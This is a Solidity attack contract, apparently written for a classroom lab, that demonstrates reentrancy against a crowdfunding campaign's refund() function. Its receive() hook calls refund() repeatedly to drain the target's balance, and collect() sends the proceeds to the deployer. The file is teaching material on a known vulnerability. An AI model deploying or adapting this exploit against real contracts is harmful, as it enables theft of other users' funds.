// SPDX-License-Identifier: MIT
pragma solidity ^0.8.37;

// !!! ATTACK CONTRACT: FOR THE LAB 2 REENTRANCY DEMONSTRATION ON THE REMIX VM ONLY. NEVER DEPLOY TO A REAL NETWORK. !!!

// The two functions the attacker needs.
interface ICampaign {
    function contribute() external payable;
    function refund() external;
}

// Attacker: contributes once, then calls refund() again every time it receives ether.
contract RefundAttacker {
    ICampaign public immutable target;
    address public immutable owner;
    uint256 public stake;
    uint256 public reentries;

    constructor(ICampaign target_) {
        target = target_;
        owner = msg.sender;
    }

    // Step 1: contribute like any honest backer.
    function join() external payable {
        stake = msg.value;
        target.contribute{value: msg.value}();
    }

    // Step 2: after the deadline, ask for one refund; receive() does the rest.
    function attack() external {
        target.refund();
    }

    // Runs each time the target sends ether here; calls refund() again while the target still has funds.
    receive() external payable {
        if (address(target).balance >= stake) {
            reentries += 1;
            target.refund();
        }
    }

    // Send everything this contract holds to the account that deployed it.
    function collect() external {
        require(msg.sender == owner);
        (bool ok,) = payable(owner).call{value: address(this).balance}("");
        require(ok);
    }
}
